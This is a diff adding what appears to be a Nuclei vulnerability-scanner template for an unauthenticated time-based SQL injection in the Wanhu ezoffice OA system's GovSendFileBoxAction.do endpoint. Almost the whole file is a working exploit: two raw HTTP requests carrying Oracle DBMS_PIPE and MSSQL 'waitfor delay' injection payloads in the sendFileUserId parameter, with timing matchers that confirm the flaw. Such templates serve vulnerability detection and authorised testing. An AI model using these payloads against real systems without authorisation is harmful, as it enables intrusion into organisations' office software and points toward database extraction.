@@ -1,0 +1,48 @@
+id: wanhu-ezoffice-GovSendFileBoxAction-sqli
+info:
+  name: 万户 ezoffice 前台 GovSendFileBoxAction.do - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/qsdj/cncs-armory-ktrimisu/blob/d01419ed32d0e0e2f60fae5352dedc766f62a3a6/pocs/cms/%E4%B8%87%E6%88%B7OA/Whir_0000.py#L54
+  metadata:
+    verified: false
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: 2014,sqli,wanhu,oa,ezeip,time,ezoffice
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20AND%205943=DBMS_PIPE.RECEIVE_MESSAGE(CHR(66)||CHR(106)||CHR(111)||CHR(73),6)%20AND%20(9258=9258&action=delBatch HTTP/1.1
+        Host: {{Hostname}}
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        name: oracle
+        dsl:
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
+
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /defaultroot/GovSendFileBoxAction.do?editId=2&sendFileUserId=1)%20waitfor%20delay%20'0:0:6'--&action=delBatch HTTP/1.1
+        Host: {{Hostname}}
+    
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        name: mssql
+        dsl:
+          - status_code == 500
+          - duration >= 5 && duration < 9
+        condition: and
